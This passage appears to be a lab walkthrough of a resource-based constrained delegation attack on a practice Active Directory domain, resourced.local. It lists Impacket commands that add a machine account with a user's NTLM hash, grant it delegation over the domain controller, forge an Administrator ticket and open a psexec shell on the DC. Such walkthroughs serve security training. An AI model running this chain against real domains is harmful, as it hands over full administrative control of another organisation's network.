Step 1 — Create your own computer account

```
impacket-addcomputer \
'resourced.local/L.Livingstone' \
-hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \
-computer-name 'ATTACKER$' \
-computer-pass 'Attacker123!' \
-dc-ip 192.168.228.175
```

This requires L.Livingstone to have the right to create computer accounts (such as `SeMachineAccountPrivilege`).

- We control Livingstone who has generic all, which allows us to modify the DC’s delegation settings
- we now made a fake account Attacker that we fully control
- we now can configure the Domain Controller to trust Attacker for delegation
- We can impersonate any user including domain admin from attacker and hence allows us to authenticate to the DC as Domain Admin.

Livingstone is a user account which typically cannot perform kerberos delegation but a computer account can so we need the computer’s account credentials to request Kerberos tickets

we need a script to help us with delegation rights.

so we use this script

Step 2 — Configure RBCD on the domain controller

```
impacket-rbcd \
'resourced.local/L.Livingstone' \
-hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \
-delegate-from 'ATTACKER$' \
-delegate-to 'RESOURCEDC$' \
-action write \
-dc-ip 192.168.228.175
```

Step 3 — Request an Administrator service ticket

```
impacket-getST \
'resourced.local/ATTACKER$:Attacker123!' \
-spn 'cifs/RESOURCEDC.RESOURCED.LOCAL' \
-impersonate Administrator \
-dc-ip 192.168.228.175
```

Step 4 — Use the ticket

Assuming the previous command produces `Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL.ccache`:

```
export KRB5CCNAME='Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL.ccache'
```

Then:

```
impacket-psexec -k -no-pass resourced.local/Administrator@RESOURCEDC.RESOURCED.LOCAL
```
